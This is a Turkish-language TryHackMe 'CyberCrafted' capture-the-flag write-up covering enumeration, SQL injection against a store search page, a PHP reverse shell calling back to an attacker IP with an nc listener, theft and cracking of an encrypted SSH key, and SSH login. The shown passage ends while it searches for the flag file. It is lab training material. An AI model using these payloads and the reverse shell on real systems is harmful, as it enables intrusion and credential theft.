---
title: Cyber Crafted
date: 2024-03-27 13:12:12 
categories: [TryHackMe]
tags: [Medium,İnjection,Linux]
image: images/crafted.png
---

You have found an IP address of an in-development Minecraft server. Can you root it?

---
<a href="https://tryhackme.com/room/cybercrafted">CyberCrafted</a>

---



Kaç tane port açık?

nmap taraması başlatalım.


nmap çıktısı:
```bash
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV -p- 10.10.207.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 23:33 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 23:33
Scanning 10.10.207.243 [4 ports]
Completed Ping Scan at 23:33, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:33
Completed Parallel DNS resolution of 1 host. at 23:33, 0.00s elapsed
Initiating SYN Stealth Scan at 23:33
Scanning 10.10.207.243 (10.10.207.243) [65535 ports]
Discovered open port 80/tcp on 10.10.207.243
Discovered open port 22/tcp on 10.10.207.243
SYN Stealth Scan Timing: About 42.52% done; ETC: 23:34 (0:00:42 remaining)
Discovered open port 25565/tcp on 10.10.207.243
Completed SYN Stealth Scan at 23:34, 67.57s elapsed (65535 total ports)
Initiating Service scan at 23:34
Scanning 3 services on 10.10.207.243 (10.10.207.243)
Completed Service scan at 23:34, 6.20s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.207.243.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.43s elapsed
Initiating NSE at 23:34
Completed NSE at 23:34, 0.38s elapsed
Nmap scan report for 10.10.207.243 (10.10.207.243)
Host is up (0.094s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.94 seconds
           Raw packets sent: 66803 (2.939MB) | Rcvd: 66600 (2.664MB)
```

Göründüğü gibi 3 tane açık port var 
> Cevap:3

2.
En yüksek portta hangi servis çalışıyor?

>Cevap: minecraft

3.
Herhangi bir alt alan adı (subdomain) var mı? (Alfabetik sırayla)

ffuz çalıştıralım.

```bash
┌──(root㉿r3tr0)-[~]
└─# ffuf -u http://cybercrafted.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cybercrafted.thm" -fs 0
```


> - u: etki alanını tanımlıyoruz.
> - w: subdamin'li kelime listesi, bu durumda SecLists'in "subdomains-top1million-5000.txt" dosyasını kullanıyorum.
> - H: bu argüman HTTP başlığını tanımlar, biz web sunucusuna hangi sanal konağın kullanılacağını söyleyen “Host”u kullanırız, yani mevcut olması durumunda o alt alan adının içeriğini döndürecektir.
> - fs: ffuf'un bize her girişimi değil, yalnızca mevcut alt alan adlarını göstermesini istediğimiz için, boyutu "0" olan yanıtları kaldırmasını, başka bir deyişle, yalnızca geçerli bir alt alan adı döndüren girişimleri göstermesini söyleyebiliriz.
{: .prompt-info }


ffuf çıktısı:

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 92ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 106ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 92ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 91ms]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 91ms]
:: Progress: [4989/4989] :: Job [1/1] :: 433 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Şimdi herhangi bir alt alan adına web tarayıcısından erişmeye çalıştığımızda sayfalar yüklenmiyor, aşağıdaki görüntüye benzer bir çıktı alıyoruz ama neden?

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a1.png?raw=true)

/etc/hosts dosyasına ip adresi ve domain, subdomain adreslerini ekleyelim. Bu şekilde sorunumuz çözülür.

```bash
┌──(root㉿r3tr0)-[~]
└─# nano /etc/hosts
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a2.png?raw=true)

Artık subdomainlere erişebiliriz. store subdomainine erişimimiz yok admine girebiliyoruz.

Sayfalara göz gezdiğimde herhangi bir güvenlik açığı görmedim.

Gobuster çalıştırarak gizli dizinleri araştıralım.

```bash
gobuster dir -u http://store.cybercrafted.thm/ -w  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
```



>Burada her parametrenin anlamı:
> - dir: gobuster'a dizinleri veya dosyaları numaralandıracağımızı söyler.
> - u: numaralandırılacak etki alanını/alt etki alanını/ip'yi tanımlar.
> - w: kullanılacak kelime listesini ayarlayın, bu durumda dirbuster'dan “directory-list-lowercase-2.3-medium.txt”, bu Kali Linux'ta varsayılan olarak kurulur.
> - x: Tanımlı uzantıya sahip dosyayı bulmak için bu parametreyi kullanabiliriz, her biri kelime listesindeki her kelimeye eklenir.
{: .prompt-info }


gobuster çıktısı:
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/index.html           (Status: 403) [Size: 287]
/.html                (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
Progress: 2947 / 830576 (0.35%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2967 / 830576 (0.36%)
===============================================================
Finished
===============================================================                                                                                                      
```

search.php sayfasına bakalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a3.png?raw=true)

Siteye eriştiğimizde minecraft item arama sayfası olduğunu görüyoruz.

SQL enjeksiyonu işe yarayabilir.

Bundan sonraki kısımları önce manuel sonra diğer bir yöntem olan sqlmap ile anlatacağım.


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a4.png?raw=true)

Gördüğümüz gibi, arama terimi listelenen kelimelerin hiçbirini içermeden liste tüm öğeleri gösteriyor ve ayrıca herhangi bir uyarı veya uyarı da göstermiyor.

Artık SQL enjeksiyonuna karşı savunmasız olduğunu biliyoruz, yönetici adını görmek için kullanabiliriz.

Bu sayfayı SQL”UNION” sorgularıyla kötüye kullanabiliriz. Bilmemiz gereken ilk şey, orijinal SQL sorgusunun aldığı alanların sayısıdır; aşağıdaki kod parçası bize bu konuda yardımcı olabilir:

```
' UNION SELECT 1, ..., n #
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a5.png?raw=true)

```
asdf' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables WHERE table_schema = 'webapp' #
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a6.png?raw=true)

Listelenen tablolardan bize ilgili bilgileri verebilecek olanı, bu durumda yöneticinin adını içerebilecek olanı seçmeliyiz. Daha sonra bu tablonun sütunlarına bakmak isteriz. Sorgu sonuncuya çok benzer, veritabanı şemasından sağlanan tabloya ait olan sütunları seçin.

```
asdf' UNION SELECT 1, 2, 3, column_name FROM information_schema.columns WHERE table_name = 'admin' #
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a7.png?raw=true)

Veritabanının yapısı hakkında daha fazla bilgiye sahibiz.

Son SQL sorgularının amacı veritabanının yapısı hakkında ayrıntılı bilgi almaktı, bu şekilde herhangi bir tablodan bazı verileri sorgulayabiliriz.

Bunu akılda tutarak, size daha fazla bilgi verebilecek olanları seçin; yöneticinin adını, şifresini ve mümkünse herhangi bir işareti almak istediğimizi unutmayın:

```
user:hash ' union select 1,2,3,group_concat(user,0x3a,hash) from admin-- - 
```


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a8.png?raw=true)



Verilen hash'i crackstation sitesinde kıralım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a9.png?raw=true)

```
xXUltimateCreeperXx
diamond123456789
```

Diğer yöntem

Sqlmap

```bash
❯ sqlmap -u "http://store.cybercrafted.thm/search.php" --method POST --data "search=doesnt&submit=matter" -p search --batch --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:21:14 /2023-11-11/

[20:21:14] [INFO] testing connection to the target URL
[20:21:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:21:15] [INFO] testing if the target URL content is stable
[20:21:15] [INFO] target URL content is stable
[20:21:15] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[20:21:16] [INFO] testing for SQL injection on POST parameter 'search'
[20:21:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:21:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:21:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:21:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:21:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:21:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:21:25] [INFO] testing 'Generic inline queries'
[20:21:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:21:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:21:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:21:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:21:40] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:21:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:21:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:21:41] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:21:42] [INFO] target URL appears to have 4 columns in query
[20:21:43] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=doesnt' AND (SELECT 3319 FROM (SELECT(SLEEP(5)))IDcE) AND 'wUnX'='wUnX&submit=matter

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=doesnt' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6a7a71,0x4e6c437776454b6d534569667761636f4d677879684b7375437972614771776166415a5767416642,0x7178717171)-- -&submit=matter
---
[20:21:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:21:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[20:21:45] [INFO] fetching current database
[20:21:45] [INFO] fetching tables for database: 'webapp'
[20:21:45] [INFO] fetching columns for table 'stock' in database 'webapp'
[20:21:45] [INFO] fetching entries for table 'stock' in database 'webapp'
Database: webapp
Table: stock
[139 entries]
+-----+------+------------------------+--------+
| id  | cost | item                   | amount |
+-----+------+------------------------+--------+
| 4   | 0.5$ | Acacia Boat            | 1x     |
| 5   | 0.5$ | Armor Stand            | 1x     |
| 6   | 0.2$ | Beetroot Seeds         | 16x    |
| 7   | 0.5$ | Birch Boat             | 1x     |
| 8   | 1$   | Bottle of Enchanting   | 64x    |
| 9   | 0.5$ | Bow                    | 1x     |
| 10  | 0.2$ | Bucket                 | 1x     |
| 11  | 0.1$ | Carrot                 | 64x    |
| 12  | 0.4$ | Cocoa Beans            | 64     |
| 13  | 0.5$ | Crossbow               | 1x     |
| 14  | 0.5$ | Dark Oak Boat          | 1x     |
| 15  | 0.1$ | Egg                    | 16x    |
| 16  | 5$   | End Crystal            | 1x     |
| 17  | 1$   | Ender Pearl            | 16     |
| 18  | 2$   | Eye of Ender           | 16x    |
| 19  | 1$   | Fire Charge            | 16x    |
| 20  | 0.8$ | Firework Rocket        | 16x    |
| 21  | 0.2$ | Fishing Rod            | 1x     |
| 22  | 0.2$ | Flint and Steel        | 1x     |
| 23  | 0.2$ | Glow Berries           | 16x    |
| 24  | 0.1$ | Glow Item Frame        | 1x     |
| 25  | 0.1$ | Item Frame             | 1x     |
| 26  | 0.5$ | Jungle Boat            | 1x     |
| 27  | 0.1$ | Kelp                   | 64x    |
| 28  | 0.5$ | Lava Bucket            | 1x     |
| 29  | 0.6$ | Lead                   | 1x     |
| 30  | 2$   | Lingering Potion       | 16x    |
| 31  | 0.8$ | Melon Seeds            | 64x    |
| 32  | 0.8$ | Minecart               | 1x     |
| 33  | 1$   | Nether Wart            | 16x    |
| 34  | 0.5$ | Oak Boat               | 1x     |
| 35  | 0.2$ | Painting               | 1x     |
| 36  | 1$   | Potato                 | 64x    |
| 37  | 2$   | Redstone Dust          | 64x    |
| 38  | 0.4$ | Snowball               | 16x    |
| 39  | 0.1$ | Splash Potion          | 1x     |
| 40  | 0.5$ | Spruce Boat            | 1x     |
| 41  | 1$   | String                 | 64x    |
| 42  | 5$   | Trident                | 1x     |
| 43  | 0.5$ | Water Bucket           | 1x     |
| 44  | 0.5$ | Wheat Seeds            | 64x    |
| 45  | 2$   | Arrow                  | 64x    |
| 46  | 1$   | Bone                   | 64x    |
| 47  | 0.4$ | Bone Meal              | 64x    |
| 48  | 0.5$ | Bowl                   | 16x    |
| 49  | 2$   | Bread                  | 64x    |
| 50  | 1$   | Chainmail Boots        | 1x     |
| 51  | 1.5$ | Chainmail Chestplate   | 1x     |
| 52  | 1$   | Chainmail Helmet       | 1x     |
| 53  | 1.2$ | Chainmail Leggings     | 1x     |
| 54  | 0.5$ | Compass                | 1x     |
| 55  | 1$   | Cooked Chicken         | 64x    |
| 56  | 1$   | Cooked Cod             | 64x    |
| 57  | 1$   | Cooked Mutton          | 64x    |
| 58  | 1$   | Cooked Porkchop        | 64x    |
| 59  | 1$   | Cooked Rabbit          | 64x    |
| 60  | 1$   | Cooked Salmon          | 64x    |
| 61  | 2$   | Diamond Axe            | 1x     |
| 62  | 4$   | Diamond Boots          | 1x     |
| 63  | 6$   | Diamond Chestplate     | 1x     |
| 64  | 2$   | Diamond Helmet         | 1x     |
| 65  | 1$   | Diamond Hoe            | 1x     |
| 66  | 2$   | Diamond Horse Armor    | 1x     |
| 67  | 5$   | Diamond Leggings       | 1x     |
| 68  | 3$   | Diamond Pickaxe        | 1x     |
| 69  | 2$   | Diamond Shovel         | 1x     |
| 70  | 4$   | Diamond Sword          | 1x     |
| 71  | 8$   | Elytra                 | 1x     |
| 72  | 150$ | Enchanted Golden Apple | 64x    |
| 73  | 5$   | Golden Apple           | 64x    |
| 74  | 1$   | Golden Axe             | 1x     |
| 75  | 2$   | Golden Boots           | 1x     |
| 76  | 4$   | Golden Carrot          | 64x    |
| 77  | 2$   | Golden Chestplate      | 1x     |
| 78  | 1$   | Golden Helmet          | 1x     |
| 79  | 0.5$ | Golden Hoe             | 1x     |
| 80  | 0.5$ | Golden Horse Armor     | 1x     |
| 81  | 0.5$ | Golden Leggings        | 1x     |
| 82  | 0.5$ | Golden Pickaxe         | 1x     |
| 83  | 0.5$ | Golden Shovel          | 1x     |
| 84  | 0.5$ | Golden Sword           | 1x     |
| 85  | 1$   | Iron Axe               | 1x     |
| 86  | 1.5$ | Iron Boots             | 1x     |
| 87  | 3$   | Iron Chestplate        | 1x     |
| 88  | 1$   | Iron Helmet            | 1x     |
| 89  | 0.5$ | Iron Hoe               | 1x     |
| 90  | 2$   | Iron Horse Armor       | 1x     |
| 91  | 2$   | Iron Leggings          | 1x     |
| 92  | 1$   | Iron Pickaxe           | 1x     |
| 93  | 0.8$ | Iron Shovel            | 1x     |
| 94  | 1$   | Iron Sword             | 1x     |
| 95  | 5$   | Lapis Lazuli           | 64x    |
| 96  | 0.2$ | Milk Bucket            | 1x     |
| 97  | 1$   | Mushroom Stew          | 16x    |
| 98  | 4$   | Name Tag               | 16x    |
| 99  | 5$   | Netherite Axe          | 1x     |
| 100 | 6$   | Netherite Boots        | 1x     |
| 101 | 10$  | Netherite Chestplate   | 1x     |
| 102 | 4$   | Netherite Helmet       | 1x     |
| 103 | 6    | Netherite Hoe          | 1x     |
| 104 | 8$   | Netherite Leggings     | 1x     |
| 105 | 5$   | Netherite Pickaxe      | 1x     |
| 106 | 5$   | Netherite Shovel       | 1x     |
| 107 | 5$   | Netherite Sword        | 1x     |
| 108 | 1$   | Saddle                 | 1x     |
| 109 | 0.5$ | Shears                 | 1x     |
| 110 | 0.5$ | Shield                 | 1x     |
| 111 | 1$   | Sugar                  | 64x    |
| 112 | 4$   | Suspicious Stew        | 1x     |
| 113 | 4$   | Tipped Arrow           | 16x    |
| 114 | 5$   | Totem of Undying       | 1x     |
| 115 | 0.2$ | Tropical Fish          | 1x     |
| 116 | 4$   | Turtle Shell           | 16x    |
| 117 | 2$   | Wheat                  | 64x    |
| 118 | 2$   | Amethyst Shard         | 16x    |
| 119 | 5$   | Blaze Powder           | 64x    |
| 120 | 5$   | Blaze Rod              | 32x    |
| 121 | 1$   | Clock                  | 1x     |
| 122 | 3$   | Coal                   | 64x    |
| 123 | 5$   | Copper Ingot           | 64x    |
| 124 | 20$  | Diamond                | 64x    |
| 125 | 20$  | Emerald                | 64x    |
| 126 | 2$   | Flint                  | 64x    |
| 127 | 10$  | Ghast Tear             | 64x    |
| 128 | 5$   | Glowstone Dust         | 64x    |
| 129 | 5$   | Gunpowder              | 64x    |
| 130 | 4$   | Heart of the Sea       | 1x     |
| 131 | 10$  | Iron Ingot             | 64x    |
| 132 | 2$   | Lapis Lazuli           | 64x    |
| 133 | 2$   | Nautilus Shell         | 16x    |
| 134 | 1$   | Nether Brick           | 64x    |
| 135 | 8$   | Nether Quartz          | 64x    |
| 136 | 10$  | Nether Star            | 1x     |
| 137 | 500$ | Netherite Ingot        | 64x    |
| 138 | 50$  | Netherite Scrap        | 64x    |
| 139 | 5$   | Raw Gold               | 64x    |
| 140 | 5$   | Raw Iron               | 64x    |
| 141 | 2$   | Shulker Shell          | 16x    |
| 142 | 1$   | Slimeball              | 16x    |
+-----+------+------------------------+--------+

[20:21:46] [INFO] table 'webapp.stock' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
[20:21:46] [INFO] fetching columns for table 'admin' in database 'webapp'
[20:21:46] [INFO] fetching entries for table 'admin' in database 'webapp'
[20:21:47] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[20:21:47] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[20:21:47] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[20:21:47] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[20:21:47] [INFO] starting 2 processes 
[20:22:35] [WARNING] no clear password(s) found                                                                                
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[20:22:35] [INFO] table 'webapp.admin' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[20:22:35] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 29 times
[20:22:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/store.cybercrafted.thm'
[20:22:35] [WARNING] your sqlmap version is outdated

[*] ending @ 20:22:35 /2023-11-11/
```

Kullanıcı adı ve şifreyi öğrendiğimize göre login sayfasından giriş yapalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a10.png?raw=true)

Giriş yaptığımızda komut çalıştırabileceğimiz bir sayfa görüyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a11.png?raw=true)

Geriye komut çalıştırmak ve reverse shell almak kaldı.

```bash
php -r '$sock=fsockopen("10.14.61.127",1234);exec("/bin/sh -i <&3 >&3 2>&3");''
nc -nvlp 1234
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a12.png?raw=true)

Makineye giriş yapmayı başardık.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2 farklı kullanıcı buluyoruz.

```bash
www-data@cybercrafted:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
www-data@cybercrafted:/$ 
```

Sahip olduğumuz şifreleri tekrar kullanmaya çalışırsak işe yaramıyor.

```bash
www-data@cybercrafted:/$ su xxultimatecreeperxx
Password: 
su: Authentication failure
www-data@cybercrafted:/$ ^C
www-data@cybercrafted:/$ su cybercrafted
Password: 
su: Authentication failure
www-data@cybercrafted:/$ 
```

Xxultimatecreeperxx kullanıcısının şifrelenmiş id_rsa'sını bulduk.

```bash
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls -la
total 16
drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .
drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 ..
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  414 Jun 27  2021 authorized_keys
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 id_rsa
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ 
```

Dosyanın içeriğini kopyalayacağım ve parolayı almak için ssh2john'u kullanacağım.

```bash
python usr/share/john/ssh2john.py id_rsa > hash
```

Ve parolayı buluyoruz.

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (id_rsa)
1g 0:00:00:06 DONE (2023-07-15 20:56) 0.1529g/s 2192Kp/s 2192Kc/s 2192KC/sa6_123..*7¡Vamos!
Session completed
```

Şimdi id_rsa'ya SSH ile bağlanabilmesi için 600 izni veriyoruz.

```bash
ssh -i id_rsa xxultimatecreeperxx@10.10.93.170
The authenticity of host '10.10.93.170 (10.10.93.170)' can't be established.
ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.170' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
xxultimatecreeperxx@cybercrafted:~$ whoami
xxultimatecreeperxx
xxultimatecreeperxx@cybercrafted:~$ export TERM=xterm
xxultimatecreeperxx@cybercrafted:~$ 
```

Minecraft server bayrağını bulalım. 

```bash
xxultimatecreeperxx@cybercrafted:/$ find / -name "minecraft_server_flag.txt" 2>/dev/null
/opt/minecraft/minecraft_server_flag.txt
xxultimatecreeperxx@cybercrafted:/$ ls -l /opt/minecraft/minecraft_server_flag.txt
-rw-r----- 1 cybercrafted minecraft 38 Jun 27  2021 /opt/minecraft/minecraft_server_flag.txt
